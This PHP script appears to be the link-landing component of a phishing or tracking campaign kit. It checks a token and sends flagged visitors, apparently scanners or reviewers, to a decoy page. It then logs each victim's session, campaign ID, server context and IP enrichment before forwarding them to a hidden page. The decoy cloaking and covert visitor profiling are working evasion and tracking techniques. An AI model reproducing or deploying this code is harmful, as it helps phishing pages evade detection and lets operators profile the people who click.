<?php
require_once __DIR__ . '/smart_engine.php';

$gate = hound_gate_check($_GET['t'] ?? null);

if (hound_should_cloak($gate)) {
    header('Location: decoy.html');
    exit;
}

require __DIR__ . '/ip.php';

$alertRecord = [
    'event_type' => 'link_open',
    'session_id' => $_GET['sid'] ?? null,
    'campaign_id' => $gate['campaign_id'],
    'server' => getServerContext(),
    'received_at' => date('c')
];
$alertRecord['server']['ip_enrichment'] = $gate['enrichment'];
$record = hound_save_event($alertRecord);

$query = $_SERVER['QUERY_STRING'] ?? '';
$target = 'forwarding_link/index.html';
if ($query !== '') {
    $target .= '?' . $query;
}
header('Location: ' . $target);
exit;
